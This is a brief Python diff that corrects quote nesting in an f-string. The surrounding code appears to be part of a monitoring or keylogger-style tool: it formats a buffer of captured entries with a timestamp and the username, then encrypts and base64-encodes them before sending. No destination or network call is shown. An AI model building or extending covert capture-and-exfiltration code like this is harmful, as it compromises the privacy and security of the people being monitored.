@@ -46,7 +46,7 @@ def main():
                 if buffer:
                     data = " | ".join(f"{k}: {''.join(v)}" for k, v in buffer.items())
                     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-                    data = f"[{timestamp}] \n [user name: {Systeminfo["username"]}] \n{data}"
+                    data = f"[{timestamp}] \n [user name: {Systeminfo['username']}] \n{data}"
                     encrypted_bytes = encryptor.encrypt(data)                          # Encrypt using your Encryptor
                     encrypted_b64 = base64.b64encode(encrypted_bytes).decode("utf-8")  # Base64 encode before sending
 
